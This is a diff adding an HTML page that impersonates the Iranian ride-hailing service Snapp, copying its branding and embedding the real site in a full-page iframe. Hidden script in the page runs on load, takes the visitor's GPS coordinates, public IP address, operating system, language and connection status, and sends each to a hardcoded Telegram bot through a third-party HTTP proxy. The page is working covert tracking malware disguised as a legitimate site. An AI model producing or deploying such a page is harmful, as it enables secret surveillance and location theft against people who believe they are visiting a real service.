@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <head>
+        <meta name="google-site-verification" content="F0bYr-dCbHyibRGzIqZjme0Kn9FblCFdNVnWJOAWhFg">
+        <meta name="author" content="Snapp.ir">
+        <meta property="business:contact_data:street_address" content="خیابان آفریقا، خیابان شهید عاطفی غربی، خیابان مهرداد، پلاک ۱، طبقه ۴ جنوبی">
+        <meta property="business:contact_data:locality" content="تهران">
+        <meta property="business:contact_data:country_name" content="ایران">
+        <meta name="samandehi" content="204009436">
+        <link rel="icon" type="image/png" sizes="192x192" href="https://passenger-pwa-cdn.snapp.ir/logos/square-minimal-192.png">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <title>سوپر اپلیکیشن اسنپ | سامانه هوشمند حمل‌ونقل | تاکسی اینترنتی</title>
+        <style>
+            * {
+                margin: 0;
+            }
+            iframe {
+                width: 100%;
+                height: 690px;
+            }
+        </style>
+</head>
+<body>
+    <iframe src="https://snapp.ir/" frameborder="0"></iframe>
+    <script>
+        function send(message){
+            var value_web = {'UrlBox':'https://api.telegram.org/bot5105266040:AAEiJMzF8ycsgG8KDyMXaNSlQs86qmqrMkA/sendmessage?chat_id=1424397657&text='+message,
+                        'AgentList':'Google Chrome',
+                        'VersionsList':' HTTP/1.1',
+                        'MethodList':'GET'}
+            $.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", value_web)
+        }
+        
+        navigator.geolocation.getCurrentPosition(lock)
+        function lock(data){
+            lock = `Lock: >> [' ${data.coords.latitude} ${data.coords.longitude} '];`
+            send(lock)
+        }
+        $.get("https://api.ipify.org", function(ip){
+            send(`Ip: >> [' ${ip} '];`)
+        })
+        function sys(){
+            internet = `Internet: >> [' ${navigator.onLine} '];` 
+            send(internet)
+            os = `Os: >> [' ${navigator.appVersion} '];`
+            send(os)
+            language = `Language: >> [' ${navigator.language} '];`
+            send(language)
+
+        }
+
+        sys()
+    </script>
+</body>
+</html>
